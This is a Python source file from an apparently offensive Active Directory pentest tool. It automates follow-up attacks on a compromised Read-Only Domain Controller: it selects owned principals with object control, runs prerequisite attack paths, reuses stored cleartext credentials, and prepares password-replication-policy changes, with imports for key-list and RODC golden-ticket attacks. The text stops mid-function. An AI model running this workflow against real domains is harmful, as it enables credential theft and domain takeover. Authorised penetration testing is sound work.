"""RODC follow-up workflow for compromised Read-Only Domain Controllers.

This follow-up targets the scenario where ADscan already controls an RODC
machine account and the operator wants to prepare password replication for a
privileged account on that RODC using ``bloodyAD``.
"""

from __future__ import annotations

from pathlib import Path
from typing import Any, Iterable

from rich.prompt import Confirm, Prompt

from adscan_internal import print_error, print_info_debug, print_warning, telemetry
from adscan_internal.cli.ldap import derive_base_dn
from adscan_internal.cli.privileged_target_selection import (
    resolve_privileged_target_user,
)
from adscan_internal.principal_utils import normalize_machine_account
from adscan_internal.rich_output import (
    mark_sensitive,
    print_info,
    print_operation_header,
    print_panel,
    print_success,
    print_system_change_warning,
    strip_sensitive_markers,
)
from adscan_internal.services.attack_graph_service import (
    add_bloodhound_path_edges,
    get_owned_attack_path_summaries_to_target,
    get_owned_domain_usernames_for_attack_paths,
    get_rodc_prp_control_paths,
    load_attack_graph,
    resolve_user_sid,
    save_attack_graph,
)
from adscan_internal.services.pivot_opportunity_service import (
    maybe_offer_pivot_opportunity_for_host_viability,
)
from adscan_internal.services import ExploitationService
from adscan_internal.services.attack_graph_runtime_service import (
    active_step,
    active_step_followup,
    update_active_step_status,
)
from adscan_internal.services.attack_path_cleanup_service import (
    begin_cleanup_scope,
    discard_cleanup_scope,
    execute_cleanup_scope,
)
from adscan_internal.services.current_vantage_reachability_service import (
    CurrentVantageTargetAssessment,
    resolve_targets_from_current_vantage,
)
from adscan_internal.services.rodc_followup_state_service import (
    RodcFollowupStateService,
)
from adscan_internal.services.exploitation.kerberos_key_list import (
    KerberosKeyListRequest,
    KerberosKeyListService,
)
from adscan_internal.services.exploitation.rodc_golden_ticket import (
    RodcGoldenTicketForger,
    RodcGoldenTicketRequest,
)
from adscan_internal.services.rodc_followup_planner import (
    resolve_rodc_krbtgt_key_plan,
)


_RODC_ALLOWED_GROUP = "Allowed RODC Password Replication Group"
_RODC_REQUIRED_ACCESS_PORTS = (445, 5985, 5986, 3389)
_RODC_OBJECT_CONTROL_RELATIONS = frozenset(
    {
        "genericall",
        "genericwrite",
        "writedacl",
        "writeowner",
        "owns",
        "writeproperty",
        "managerodcprp",
    }
)
_RODC_OBJECT_CONTROL_CANDIDATE_RELATIONS = frozenset()


def _normalize_attr_values(values: Iterable[str]) -> tuple[str, ...]:
    """Return trimmed multi-valued LDAP attribute values preserving order."""
    normalized: list[str] = []
    seen: set[str] = set()
    for raw_value in values:
        value = str(raw_value or "").strip()
        key = value.casefold()
        if not value or key in seen:
            continue
        seen.add(key)
        normalized.append(value)
    return tuple(normalized)


def _parse_bloodyad_multi_value_output(output: str) -> dict[str, tuple[str, ...]]:
    """Parse repeated ``key: value`` BloodyAD output lines into tuples."""
    values: dict[str, list[str]] = {}
    for raw_line in str(output or "").splitlines():
        line = str(raw_line or "").strip()
        if not line or ":" not in line:
            continue
        key, value = line.split(":", 1)
        key_clean = key.strip()
        value_clean = value.strip()
        if not key_clean or not value_clean:
            continue
        values.setdefault(key_clean, []).append(value_clean)
    return {
        key: _normalize_attr_values(raw_values) for key, raw_values in values.items()
    }


def _normalize_rodc_prp_attribute_values(
    parsed_values: dict[str, tuple[str, ...]],
    attribute_name: str,
) -> tuple[str, ...]:
    """Return normalized PRP values even when BloodyAD emits one semicolon-joined line.

    ``bloodyAD get object`` may render DN-valued multi-attributes such as
    ``msDS-NeverRevealGroup`` as a single line with entries separated by ``;``.
    The follow-up restore path needs each DN as its own ``-v`` argument.
    """
    raw_values = parsed_values.get(attribute_name, ())
    normalized: list[str] = []
    seen: set[str] = set()
    for raw_value in raw_values:
        value = str(raw_value or "").strip()
        if not value:
            continue
        parts = [part.strip() for part in value.split(";")]
        for part in parts:
            if not part:
                continue
            key = part.casefold()
            if key in seen:
                continue
            seen.add(key)
            normalized.append(part)
    return tuple(normalized)


def _resolve_workspace_dir(shell: Any) -> str:
    """Return the effective workspace directory for current-vantage lookups."""
    if hasattr(shell, "_get_workspace_cwd"):
        return shell._get_workspace_cwd()  # type: ignore[attr-defined]
    return str(getattr(shell, "current_workspace_dir", "") or "")


def _first_hostname_candidate(
    assessment: CurrentVantageTargetAssessment,
    *,
    fallback_host: str,
) -> str:
    """Return a stable host identifier from a reachability assessment."""
    for candidate in assessment.matched_hostnames:
        clean = str(candidate or "").strip()
        if clean:
            return clean
    return str(fallback_host or "").strip()


def _build_rodc_target_candidates(domain: str, machine_account: str) -> tuple[str, ...]:
    """Return current-vantage target candidates for one RODC machine account."""
    normalized_machine = normalize_machine_account(machine_account)
    stem = normalized_machine.rstrip("$")
    domain_clean = str(domain or "").strip()
    candidates = [normalized_machine, stem]
    if stem and domain_clean:
        candidates.append(f"{stem}.{domain_clean}")
    return tuple(candidate for candidate in candidates if str(candidate or "").strip())


def _normalize_graph_principal_label(value: str) -> str:
    """Normalize a graph/UI principal label to its account token."""
    clean = strip_sensitive_markers(str(value or "")).strip()
    if "@" in clean:
        clean = clean.split("@", 1)[0]
    return clean.strip().lower()


def _summary_terminal_relation_local(record: dict[str, Any]) -> str:
    """Return the last executable relation key for one summary record."""
    steps = record.get("steps")
    if isinstance(steps, list):
        terminal_relation = ""
        for step in steps:
            if not isinstance(step, dict):
                continue
            relation = str(step.get("action") or "").strip()
            if not relation or relation.lower() == "memberof":
                continue
            terminal_relation = relation
        if terminal_relation:
            return str(terminal_relation or "").strip().lower()
    relations = record.get("relations")
    if isinstance(relations, list):
        for relation in reversed(relations):
            relation_clean = str(relation or "").strip()
            if not relation_clean or relation_clean.lower() == "memberof":
                continue
            return relation_clean.lower()
    return ""


def _rodc_control_path_requires_prerequisite_execution(record: dict[str, Any]) -> bool:
    """Return True when a confirmed RODC-control path still needs prior steps.

    For this follow-up, the terminal ACL/control step can remain merely
    discovered because it represents existing object control once the earlier
    executable steps are materialized. What blocks the follow-up is any earlier
    executable step that is not already successful in the current graph state.
    """
    steps = record.get("steps")
    if not isinstance(steps, list):
        return False

    executable_steps: list[dict[str, Any]] = []
    for step in steps:
        if not isinstance(step, dict):
            continue
        action = str(step.get("action") or "").strip().lower()
        if not action or action == "memberof":
            continue
        executable_steps.append(step)

    if len(executable_steps) <= 1:
        return False

    for step in executable_steps[:-1]:
        status = str(step.get("status") or "").strip().lower()
        if status not in {"success", "exploited"}:
            return True
    return False


def _find_rodc_graph_node(
    graph: dict[str, Any],
    *,
    domain: str,
    machine_account: str,
) -> tuple[str | None, str]:
    """Resolve the attack-graph node id and display label for one RODC machine."""
    nodes_map = graph.get("nodes") if isinstance(graph.get("nodes"), dict) else {}
    if not isinstance(nodes_map, dict):
        return None, normalize_machine_account(machine_account)

    normalized_machine = normalize_machine_account(machine_account)
    label_candidates = {
        normalized_machine.casefold(),
        f"{normalized_machine}@{str(domain or '').strip()}".casefold(),
        f"{normalized_machine}@{str(domain or '').strip().upper()}".casefold(),
    }
    for node_id, node in nodes_map.items():
        if not isinstance(node, dict):
            continue
        label = str(node.get("label") or node.get("name") or "").strip()
        if not label:
            continue
        if label.casefold() in label_candidates:
            return str(node_id), label
    return None, normalized_machine


def _candidate_records_for_rodc_control_paths(
    *,
    paths: list[dict[str, Any]],
    owned_principals: Iterable[str],
) -> list[dict[str, Any]]:
    """Return effective owned-principal candidates for RODC object-control paths."""
    owned_principal_labels = {
        normalized
        for principal in owned_principals
        if (normalized := _normalize_graph_principal_label(principal))
    }
    candidates_by_user: dict[str, dict[str, Any]] = {}
    for path in paths:
        if not isinstance(path, dict):
            continue
        terminal_relation = _summary_terminal_relation_local(path)

        candidate_labels: list[str] = []
        steps = path.get("steps")
        if isinstance(steps, list):
            for step in reversed(steps):
                if not isinstance(step, dict):
                    continue
                details = (
                    step.get("details") if isinstance(step.get("details"), dict) else {}
                )
                step_labels: list[str] = []
                for key in ("to", "from"):
                    raw_value = details.get(key)
                    if isinstance(raw_value, str) and raw_value.strip():
                        step_labels.append(
                            strip_sensitive_markers(str(raw_value)).strip()
                        )
                for candidate_label in step_labels:
                    normalized_candidate = _normalize_graph_principal_label(
                        candidate_label
                    )
                    if not normalized_candidate:
                        continue
                    if normalized_candidate in owned_principal_labels:
                        candidate_labels.append(candidate_label)
                        break
                if candidate_labels:
                    break

        if not candidate_labels:
            meta = path.get("meta")
            if isinstance(meta, dict):
                affected_users = meta.get("affected_users")
                if isinstance(affected_users, list):
                    for affected_user in affected_users:
                        affected_clean = strip_sensitive_markers(
                            str(affected_user or "")
                        ).strip()
                        if not affected_clean:
                            continue
                        candidate_labels.append(affected_clean)

        if not candidate_labels:
            nodes = path.get("nodes")
            if isinstance(nodes, list):
                for raw_node in reversed(nodes[:-1]):
                    candidate_label = strip_sensitive_markers(str(raw_node or "")).strip()
                    normalized_candidate = _normalize_graph_principal_label(
                        candidate_label
                    )
                    if not normalized_candidate:
                        continue
                    if normalized_candidate in owned_principal_labels:
                        candidate_labels.append(candidate_label)
                        break

        if not candidate_labels:
            source_label = str(path.get("source") or "").strip()
            if not source_label:
                nodes = path.get("nodes")
                if isinstance(nodes, list) and nodes:
                    source_label = str(nodes[0] or "").strip()
            if source_label:
                candidate_labels.append(source_label)

        for candidate_label in candidate_labels:
            normalized_source = _normalize_graph_principal_label(candidate_label)
            if not normalized_source:
                continue
            record = candidates_by_user.setdefault(
                normalized_source,
                {
                    "username": candidate_label.split("@", 1)[0]
                    if "@" in candidate_label
                    else candidate_label,
                    "label": candidate_label,
                    "relations": [],
                    "sample_path": path,
                },
            )
            relations = record.get("relations")
            if (
                isinstance(relations, list)
                and terminal_relation
                and terminal_relation not in relations
            ):
                relations.append(terminal_relation)

    return sorted(
        candidates_by_user.values(),
        key=lambda entry: str(entry.get("username") or "").lower(),
    )


def _assess_rodc_object_control(
    shell: Any,
    *,
    domain: str,
    machine_account: str,
    actor_username: str,
) -> dict[str, Any]:
    """Return whether an owned principal can reach confirmed RODC PRP control."""
    graph = load_attack_graph(shell, domain)
    if not isinstance(graph, dict):
        return {
            "ready": False,
            "reason": "graph_unavailable",
            "target_label": normalize_machine_account(machine_account),
            "current_actor_ready": False,
            "candidates": [],
            "candidate_paths": [],
            "ready_paths": [],
            "prerequisite_paths": [],
        }

    _target_node_id, target_label = _find_rodc_graph_node(
        graph,
        domain=domain,
        machine_account=machine_account,
    )
    if not target_label:
        return {
            "ready": False,
            "reason": "target_missing",
            "target_label": normalize_machine_account(machine_account),
            "current_actor_ready": False,
            "candidates": [],
            "candidate_paths": [],
            "ready_paths": [],
            "prerequisite_paths": [],
        }

    owned_principals = get_owned_domain_usernames_for_attack_paths(shell, domain)
    current_actor_norm = _normalize_graph_principal_label(actor_username)
    if not owned_principals:
        return {
            "ready": False,
            "reason": "no_owned_principals",
            "target_label": target_label,
            "current_actor_ready": False,
            "candidates": [],
            "candidate_paths": [],
            "ready_paths": [],
            "prerequisite_paths": [],
        }

    target_paths = get_owned_attack_path_summaries_to_target(
        shell,
        domain,
        target_label=target_label,
        max_depth=8,
        max_paths=None,
        target_mode="tier0",
        engine_override="local",
        dev_workers_override=0,
        render_debug_tables=False,
    )
    confirmed_paths = [
        path
        for path in target_paths
        if _summary_terminal_relation_local(path) in _RODC_OBJECT_CONTROL_RELATIONS
    ]
    directly_usable_paths = [
        path
        for path in confirmed_paths
        if not _rodc_control_path_requires_prerequisite_execution(path)
    ]
    prerequisite_paths = [
        path
        for path in confirmed_paths
        if _rodc_control_path_requires_prerequisite_execution(path)
    ]
    candidates = _candidate_records_for_rodc_control_paths(
        paths=directly_usable_paths,
        owned_principals=owned_principals,
    )
    if candidates:
        candidate_norms = {
            _normalize_graph_principal_label(str(entry.get("username") or ""))
            for entry in candidates
        }
        return {
            "ready": True,
            "reason": "ok",
            "target_label": target_label,
            "current_actor_ready": current_actor_norm in candidate_norms,
            "candidates": candidates,
            "candidate_paths": directly_usable_paths,
            "ready_paths": directly_usable_paths,
            "prerequisite_paths": prerequisite_paths,
        }

    prerequisite_candidates = _candidate_records_for_rodc_control_paths(
        paths=prerequisite_paths,
        owned_principals=owned_principals,
    )
    if prerequisite_candidates:
        return {
            "ready": False,
            "reason": "prerequisite_path_available",
            "target_label": target_label,
            "current_actor_ready": False,
            "candidates": prerequisite_candidates,
            "candidate_paths": prerequisite_paths,
            "ready_paths": directly_usable_paths,
            "prerequisite_paths": prerequisite_paths,
        }

    candidate_paths = list(target_paths)
    candidate_records = _candidate_records_for_rodc_control_paths(
        paths=candidate_paths,
        owned_principals=owned_principals,
    )
    if candidate_records:
        return {
            "ready": False,
            "reason": "candidate_only",
            "target_label": target_label,
            "current_actor_ready": False,
            "candidates": candidate_records,
            "candidate_paths": candidate_paths,
            "ready_paths": directly_usable_paths,
            "prerequisite_paths": prerequisite_paths,
        }

    return {
        "ready": False,
        "reason": "no_owned_object_control",
        "target_label": target_label,
        "current_actor_ready": False,
        "candidates": [],
        "candidate_paths": [],
        "ready_paths": [],
        "prerequisite_paths": [],
    }


def _maybe_select_ready_rodc_object_control_path(
    shell: Any,
    *,
    domain: str,
    machine_account: str,
    actor_username: str,
    object_control: dict[str, Any],
) -> dict[str, Any]:
    """Let the operator choose among ready and prerequisite RODC PRP-control paths."""
    ready_paths = [
        path
        for path in list(
            object_control.get("ready_paths")
            or (
                object_control.get("candidate_paths")
                if bool(object_control.get("ready"))
                else []
            )
            or []
        )
        if isinstance(path, dict)
    ]
    prerequisite_paths = [
        path
        for path in list(
            object_control.get("prerequisite_paths")
            or (
                object_control.get("candidate_paths")
                if str(object_control.get("reason") or "").strip().lower()
                == "prerequisite_path_available"
                else []
            )
            or []
        )
        if isinstance(path, dict)
    ]
    if not bool(object_control.get("ready")) and not prerequisite_paths:
        print_info_debug(
            "[rodc] ready-path selection bypassed: "
            f"ready={bool(object_control.get('ready'))} "
            f"reason={mark_sensitive(str(object_control.get('reason') or 'unknown'), 'detail')} "
            f"target={mark_sensitive(str(object_control.get('target_label') or machine_account), 'user')}"
        )
        return object_control
    if bool(object_control.get("ready")) and not prerequisite_paths:
        print_info_debug(
            "[rodc] ready-path selection bypassed because no prerequisite path remains: "
            f"ready_paths={len(ready_paths)} "
            f"target={mark_sensitive(str(object_control.get('target_label') or machine_account), 'user')}"
        )
        return object_control

    auto_mode = bool(getattr(shell, "auto", False))
    print_info_debug(
        "[rodc] ready-path selection gate: "
        f"ready_paths={len(ready_paths)} "
        f"prerequisite_paths={len(prerequisite_paths)} "
        f"candidates={len(list(object_control.get('candidates') or []))} "
        f"auto={auto_mode} "
        f"current_actor_ready={bool(object_control.get('current_actor_ready'))} "
        f"target={mark_sensitive(str(object_control.get('target_label') or machine_account), 'user')}"
    )
    if (not ready_paths and not prerequisite_paths) or auto_mode:
        skip_reason = (
            "no_candidate_paths"
            if not ready_paths and not prerequisite_paths
            else "auto_mode"
        )
        print_info_debug(
            "[rodc] ready-path selection skipped: "
            f"skip_reason={mark_sensitive(skip_reason, 'detail')} "
            f"target={mark_sensitive(str(object_control.get('target_label') or machine_account), 'user')}"
        )
        return object_control

    from adscan_internal.cli.attack_path_execution import print_attack_paths_summary

    print_panel(
        "\n".join(
            [
                (
                    f"ADscan found {len(ready_paths)} confirmed attack path(s) that already provide "
                    f"PRP-control over {mark_sensitive(str(object_control.get('target_label') or machine_account), 'user')}."
                    if ready_paths
                    else f"ADscan found no confirmed ready PRP-control path yet for {mark_sensitive(str(object_control.get('target_label') or machine_account), 'user')}."
                ),
                (
                    f"ADscan also found {len(prerequisite_paths)} prerequisite path(s) that can materialize PRP-control first."
                    if prerequisite_paths
                    else "No additional prerequisite path is currently available."
                ),
                f"The current actor {mark_sensitive(actor_username, 'user')} is not necessarily the effective LDAP actor for every path.",
                "Select how you want to continue with the RODC PRP follow-up.",
            ]
        ),
        title="[bold blue]Choose RODC PRP Path[/bold blue]",
        border_style="blue",
        expand=False,
    )
    if ready_paths:
        print_panel(
            "These paths are immediately usable for the LDAP PRP-modification phase.",
            title="[bold green]Ready Now[/bold green]",
            border_style="green",
            expand=False,
        )
        print_attack_paths_summary(
            domain,
            ready_paths,
            max_display=min(5, len(ready_paths)),
            search_mode_label="RODC PRP control path selection",
            actionable_count=len(ready_paths),
            show_sections=False,
        )
    if prerequisite_paths:
        print_panel(
            "These paths require prerequisite execution first, then ADscan will revalidate PRP-control.",
            title="[bold yellow]Needs Prerequisite Execution[/bold yellow]",
            border_style="yellow",
            expand=False,
        )
        print_attack_paths_summary(
            domain,
            prerequisite_paths,
            max_display=min(5, len(prerequisite_paths)),
            search_mode_label="RODC PRP prerequisite path selection",
            actionable_count=len(prerequisite_paths),
            show_sections=False,
        )

    selection_entries: list[tuple[str, dict[str, Any]]] = []
    for summary in ready_paths[:5]:
        selection_entries.append(("ready", summary))
    for summary in prerequisite_paths[:5]:
        selection_entries.append(("prerequisite", summary))

    options = [
        (
            f"{idx + 1}. [Ready] {summary.get('source')} -> {summary.get('target')} "
            f"[{summary.get('status')}]"
            if category == "ready"
            else f"{idx + 1}. [Needs prerequisite] {summary.get('source')} -> {summary.get('target')} "
            f"[{summary.get('status')}]"
        )
        for idx, (category, summary) in enumerate(selection_entries)
    ]
    options.append("Cancel RODC follow-up")

    selected_idx = None
    if hasattr(shell, "_questionary_select"):
        try:
            selected_idx = shell._questionary_select(
                "Select the attack path to use for RODC PRP control:",
                options,
                default_idx=0,
                context={
                    "remote_interaction": True,
                    "category": "rodc_followup",
                    "domain": domain,
                    "candidate_count": len(selection_entries),
                },
            )
        except TypeError:
            selected_idx = shell._questionary_select(
                "Select the attack path to use for RODC PRP control:",
                options,
                default_idx=0,
            )
    if selected_idx is None:
        selected_choice = Prompt.ask(
            "Select how to continue with RODC PRP control (or 0 to cancel)",
            choices=[str(index) for index in range(0, len(options))],
            default="1",
        )
        try:
            selected_raw = int(selected_choice)
        except ValueError:
            selected_raw = 0
        selected_idx = len(options) - 1 if selected_raw <= 0 else selected_raw - 1

    if selected_idx >= len(selection_entries):
        print_info("Skipping RODC follow-up by user choice.")
        print_info_debug(
            "[rodc] ready-path selection cancelled by user: "
            f"candidate_paths={len(selection_entries)} "
            f"target={mark_sensitive(str(object_control.get('target_label') or machine_account), 'user')}"
        )
        return {
            **object_control,
            "ready": False,
            "reason": "user_declined_ready_path_selection",
        }

    selected_category, selected_path = selection_entries[selected_idx]
    if selected_category == "prerequisite":
        from adscan_internal.cli.attack_path_execution import (
            offer_attack_paths_for_execution_summaries,
        )

        def _recompute_prerequisite_summaries() -> list[dict[str, Any]]:
            refreshed = _assess_rodc_object_control(
                shell,
                domain=domain,
                machine_account=machine_account,
                actor_username=actor_username,
            )
            return list(refreshed.get("prerequisite_paths") or [])

        executed = offer_attack_paths_for_execution_summaries(
            shell,
            domain,
            summaries=[selected_path],
            max_display=1,
            search_mode_label="RODC prerequisite search",
            show_sections=False,
            recompute_summaries=_recompute_prerequisite_summaries,
            snapshot_scope="owned",
            snapshot_target="all",
            snapshot_target_mode="tier0",
        )
        if not executed:
            print_info(
                "RODC prerequisite attack path was not executed, so the follow-up cannot continue."
            )
            return {
                **object_control,
                "ready": False,
                "reason": "user_declined_prerequisite_path_selection",
            }

        refreshed = _assess_rodc_object_control(
            shell,
            domain=domain,
            machine_account=machine_account,
            actor_username=actor_username,
        )
        if bool(refreshed.get("ready")):
            print_success(
                f"RODC prerequisite path completed and confirmed object control is now available for {mark_sensitive(str(refreshed.get('target_label') or machine_account), 'user')}."
            )
        else:
            print_warning(
                "ADscan executed the selected prerequisite path, but confirmed RODC PRP-write capability is still not available."
            )
        return refreshed

    owned_principals = get_owned_domain_usernames_for_attack_paths(shell, domain)
    selected_candidates = _candidate_records_for_rodc_control_paths(
        paths=[selected_path],
        owned_principals=owned_principals,
    )
    current_actor_norm = _normalize_graph_principal_label(actor_username)
    candidate_norms = {
        _normalize_graph_principal_label(str(entry.get("username") or ""))
        for entry in selected_candidates
    }
    print_info_debug(
        "[rodc] ready-path selection applied: "
        f"selected_index={selected_idx} "
        f"selected_category={mark_sensitive(selected_category, 'detail')} "
        f"selected_source={mark_sensitive(str(selected_path.get('source') or 'unknown'), 'user')} "
        f"selected_target={mark_sensitive(str(selected_path.get('target') or machine_account), 'user')} "
        f"selected_candidates={len(selected_candidates)}"
    )
    return {
        **object_control,
        "candidates": selected_candidates,
        "candidate_paths": [selected_path],
        "current_actor_ready": current_actor_norm in candidate_norms,
    }


def _refresh_rodc_prp_control_edges(
    shell: Any,
    *,
    domain: str,
) -> int:
    """Refresh custom ``ManageRODCPrp`` edges in the local graph before follow-up use."""
    graph = load_attack_graph(shell, domain)
    if not isinstance(graph, dict):
        return 0

    raw_paths = get_rodc_prp_control_paths(
        shell,
        domain,
        graph=graph,
        force_refresh=True,
    )
    if not raw_paths:
        return 0

    added_edges = 0
    for entry in raw_paths:
        nodes = entry.get("nodes") or []
        rels = entry.get("rels") or []
        if not isinstance(nodes, list) or not isinstance(rels, list):
            continue
        added_edges += int(
            add_bloodhound_path_edges(
                graph,
                nodes=[node for node in nodes if isinstance(node, dict)],
                relations=[str(rel) for rel in rels],
                status="discovered",
                edge_type="custom_acl",
                notes_by_relation_index=(
                    entry.get("notes_by_relation_index")
                    if isinstance(entry.get("notes_by_relation_index"), dict)
                    else None
                ),
                log_creation=False,
                shell=shell,
                force_opengraph=True,
            )
            or 0
        )

    if added_edges:
        save_attack_graph(shell, domain, graph)
        print_info_debug(
            f"[rodc-prp] refreshed delegated RODC PRP edges for {mark_sensitive(domain, 'domain')}: "
            f"added_edges={added_edges}"
        )
    return added_edges


def _owned_cleartext_credentials(
    shell: Any, *, domain: str
) -> dict[str, tuple[str, str]]:
    """Return owned principals that have reusable cleartext domain credentials."""
    owned_users = get_owned_domain_usernames_for_attack_paths(shell, domain)
    credentials = (
        getattr(shell, "domains_data", {}).get(domain, {}).get("credentials", {})
    )
    if not isinstance(credentials, dict):
        return {}

    results: dict[str, tuple[str, str]] = {}
    for owned_user in owned_users:
        normalized_owned = _normalize_graph_principal_label(owned_user)
        if not normalized_owned:
            continue
        for stored_user, stored_credential in credentials.items():
            if _normalize_graph_principal_label(str(stored_user)) != normalized_owned:
                continue
            credential = str(stored_credential or "").strip()
            if not credential:
                break
            if getattr(shell, "is_hash", lambda _value: False)(credential):
                break
            results[normalized_owned] = (str(stored_user), credential)
            break
    return results


def _select_rodc_policy_actor(
    shell: Any,
    *,
    domain: str,
    current_actor: str,
    candidates: list[dict[str, Any]],
) -> dict[str, Any]:
    """Return the LDAP actor ADscan should use for the RODC PRP phase."""
    credentials_by_user = _owned_cleartext_credentials(shell, domain=domain)
    enriched_candidates: list[dict[str, Any]] = []
    for candidate in candidates:
        username = str(candidate.get("username") or "").strip()
        normalized_username = _normalize_graph_principal_label(username)
        credential_record = credentials_by_user.get(normalized_username)
        enriched_candidates.append(
            {
                **candidate,
                "credential_ready": credential_record is not None,
                "credential_username": credential_record[0]
                if credential_record
                else None,
                "credential_secret": credential_record[1]
                if credential_record
                else None,
            }
        )

    ready_candidates = [
        candidate
        for candidate in enriched_candidates
        if bool(candidate.get("credential_ready"))
    ]
    current_actor_norm = _normalize_graph_principal_label(current_actor)
    selected: dict[str, Any] | None = None
    for candidate in ready_candidates:
        if (
            _normalize_graph_principal_label(str(candidate.get("username") or ""))
            == current_actor_norm
        ):
            selected = candidate
            break

    if selected is None and ready_candidates:
        if len(ready_candidates) == 1 or getattr(shell, "auto", False):
            selected = ready_candidates[0]
        else:
            option_map = {
                str(index): candidate
                for index, candidate in enumerate(ready_candidates, start=1)
            }
            lines = []
            for option, candidate in option_map.items():
                relations = (
                    ", ".join(
                        str(value) for value in (candidate.get("relations") or [])
                    )
                    or "unknown"
                )
                lines.append(
                    f"{option}. {mark_sensitive(str(candidate.get('label') or candidate.get('username') or ''), 'user')} via {mark_sensitive(relations, 'detail')}"
                )
            print_panel(
                "\n".join(lines),
                title="[bold blue]RODC LDAP Actor Choices[/bold blue]",
                border_style="blue",
                expand=False,
            )
            selected_key = Prompt.ask(
                "Principal to use for the RODC LDAP policy phase",
                choices=list(option_map.keys()),
                default="1",
            )
            selected = option_map.get(str(selected_key), ready_candidates[0])

    return {
        "ready": selected is not None,
        "selected": selected,
        "current_actor_ready": selected is not None
        and _normalize_graph_principal_label(str(selected.get("username") or ""))
        == current_actor_norm,
        "candidates": enriched_candidates,
        "reason": "ok" if selected is not None else "no_reusable_cleartext_credential",
    }


def _print_rodc_object_control_guidance(
    *,
    domain: str,
    target_label: str,
    actor_username: str,
    reason: str,
    candidates: list[dict[str, Any]],
) -> None:
    """Explain why the RODC PRP modification phase is blocked or rerouted."""
    marked_domain = mark_sensitive(domain, "domain")
    marked_target = mark_sensitive(target_label, "user")
    marked_actor = mark_sensitive(actor_username, "user")
    print_warning(
        f"RODC follow-up cannot safely continue for {marked_target} in {marked_domain} with the current actor {marked_actor}."
    )

    lines = [
        "To modify the RODC password-replication policy, ADscan needs an owned principal with object-control rights over the RODC computer object.",
        "",
        "Accepted rights:",
        "- GenericAll",
        "- GenericWrite",
        "- WriteDacl / WriteOwner / Owns",
        "- WriteProperty on msDS-RevealOnDemandGroup and msDS-NeverRevealGroup",
        "- ManageRODCPrp (ADscan custom delegated PRP-control edge)",
        "",
    ]
    if reason in {"graph_unavailable", "target_missing"}:
        lines.extend(
            [
                "ADscan could not validate the RODC object-control prerequisite from the current attack graph.",
                "Refresh or rebuild the attack graph before retrying this follow-up.",
            ]
        )
    elif reason == "no_owned_principals":
        lines.extend(
            [
                "No owned principals with reusable domain credentials are currently stored for this domain.",
                "Compromise or add a qualifying principal before retrying the RODC object-control phase.",
            ]
        )
    elif candidates:
        lines.append("Owned principals with direct control over the RODC object:")
        for candidate in candidates:
            relations = (
                ", ".join(
                    str(relation) for relation in (candidate.get("relations") or [])
                )
                or "unknown"
            )
            credential_note = ""
            if "credential_ready" in candidate:
                credential_note = (
                    " (reusable password stored)"
                    if bool(candidate.get("credential_ready"))
                    else " (no reusable cleartext credential stored)"
                )
            lines.append(
                f"- {mark_sensitive(str(candidate.get('label') or candidate.get('username') or ''), 'user')} via {mark_sensitive(relations, 'detail')}{credential_note}"
            )
        if reason == "candidate_only":
            lines.extend(
                [
                    "",
                    "ADscan found only candidate RODC-control paths whose last step is not confirmed for PRP writes.",
                    "These paths may help with RODC host administration or RBCD, but ADscan cannot treat them as confirmed permission to modify msDS-RevealOnDemandGroup or msDS-NeverRevealGroup.",
                ]
            )
        elif reason == "no_reusable_cleartext_credential":
            lines.extend(
                [
                    "",
                    "ADscan can see object-control rights, but it does not currently have a reusable cleartext password for any qualifying principal.",
                    "Add or recover a reusable password for one of the principals above before retrying this follow-up.",
                ]
            )
        else:
            lines.extend(
                [
                    "",
                    f"Re-run the RODC policy-modification phase with one of those principals instead of {marked_actor}.",
                ]
            )
    else:
        lines.extend(
            [
                "None of the currently owned principals appear to have direct object-control rights over the RODC computer object.",
                "The RODC machine account alone is not enough to edit msDS-RevealOnDemandGroup or msDS-NeverRevealGroup.",
            ]
        )

    print_panel(
        "\n".join(lines),
        title="[bold yellow]RODC Object-Control Prerequisite Missing[/bold yellow]",
        border_style="yellow",
        expand=False,
    )


def _maybe_execute_rodc_object_control_prerequisites(
    shell: Any,
    *,
    domain: str,
    machine_account: str,
    actor_username: str,
    object_control: dict[str, Any],
) -> dict[str, Any]:
    """Offer prerequisite path execution when RODC control is reachable but not yet materialized."""
    if not bool(getattr(shell, "auto", False)):
        print_info_debug(
            "[rodc] prerequisite execution deferred to interactive unified selector: "
            f"target={mark_sensitive(str(object_control.get('target_label') or machine_account), 'user')}"
        )
        return object_control

    if (
        str(object_control.get("reason") or "").strip().lower()
        != "prerequisite_path_available"
    ):
        return object_control

    prerequisite_paths = list(object_control.get("candidate_paths") or [])
    if not prerequisite_paths:
        return object_control

    target_label = str(object_control.get("target_label") or machine_account)
    path_count = len(prerequisite_paths)
    print_panel(
        "\n".join(
            [
                f"ADscan found {path_count} owned attack path(s) that can materialize confirmed RODC object control over {mark_sensitive(target_label, 'user')}.",
                f"The current actor {mark_sensitive(actor_username, 'user')} cannot modify the RODC PRP yet.",
                "ADscan can execute one of the prerequisite paths first, then revalidate the RODC control check before touching LDAP.",
            ]
        ),
        title="[bold blue]RODC Prerequisite Path Available[/bold blue]",
        border_style="blue",
        expand=False,
    )

    from adscan_internal.cli.attack_path_execution import (
        offer_attack_paths_for_execution_summaries,
    )

    def _recompute_prerequisite_summaries() -> list[dict[str, Any]]:
        refreshed = _assess_rodc_object_control(
            shell,
            domain=domain,
            machine_account=machine_account,
            actor_username=actor_username,
        )
        if (
            str(refreshed.get("reason") or "").strip().lower()
            != "prerequisite_path_available"
        ):
            return []
        return list(refreshed.get("candidate_paths") or [])

    executed = offer_attack_paths_for_execution_summaries(
        shell,
        domain,
        summaries=prerequisite_paths,
        max_display=min(5, len(prerequisite_paths)),
        search_mode_label="RODC prerequisite search",
        show_sections=False,
        recompute_summaries=_recompute_prerequisite_summaries,
        snapshot_scope="owned",
        snapshot_target="all",
        snapshot_target_mode="tier0",
    )
    if not executed:
        print_info(
            "RODC prerequisite attack path was not executed, so the follow-up cannot continue."
        )
        return object_control

    refreshed = _assess_rodc_object_control(
        shell,
        domain=domain,
        machine_account=machine_account,
        actor_username=actor_username,
    )
    if bool(refreshed.get("ready")):
        print_success(
            f"RODC prerequisite path completed and confirmed object control is now available for {mark_sensitive(str(refreshed.get('target_label') or machine_account), 'user')}."
        )
        return refreshed

    print_warning(
        "ADscan executed a prerequisite attack path, but confirmed RODC PRP-write capability is still not available."
    )
    return refreshed


def _assess_rodc_host_followup_access(
    shell: Any,
    *,
    domain: str,
    machine_account: str,
) -> CurrentVantageTargetAssessment | None:
    """Return a reachable RODC host assessment or ``None`` when blocked."""
    normalized_machine = normalize_machine_account(machine_account)
    resolution = resolve_targets_from_current_vantage(
        _resolve_workspace_dir(shell),
        getattr(shell, "domains_dir", "domains"),
